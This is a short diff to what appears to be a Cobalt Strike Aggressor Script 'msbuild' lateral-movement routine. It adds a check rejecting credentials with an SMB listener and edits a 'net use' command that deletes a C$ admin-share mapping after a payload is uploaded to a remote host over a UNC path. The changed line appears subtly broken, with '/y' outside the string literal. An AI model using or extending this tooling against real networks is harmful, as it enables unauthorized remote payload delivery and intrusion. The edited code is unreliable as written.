@@ -192,9 +192,13 @@ sub msbuild {
 	############
 	#Ensure listener exists
 	if (%args['listener'] !in listeners_local()) {
-    	berror($1, "Listener " . %args['listener'] . " does not exist");
-    	return;
+    		berror($1, "Listener " . %args['listener'] . " does not exist");
+    		return;
    	}
+	else if ( 'user' in args && listener_info(%args['listener'], 'payload') ismatch '.*smb.*') { 
+		berror($1, "You can't specify a username/password with an SMB listener. Either make_token as your target user or specify a different listener."); 
+		return;
+	}
 
 	###############
 	# MSBuild.exe #
@@ -258,7 +262,7 @@ sub msbuild {
 		sleep(5000);
 		bupload_raw($1, $unc . $filename , $payload);
 		sleep(2000);
-		bshell($1, 'net use \\\\'. %args['target'] . '\\C$ /delete');
+		bshell($1, 'net use \\\\'. %args['target'] . '\\C$ /delete' /y);
 	}
 	else {
 		bupload_raw($1, $unc . $filename , $payload);
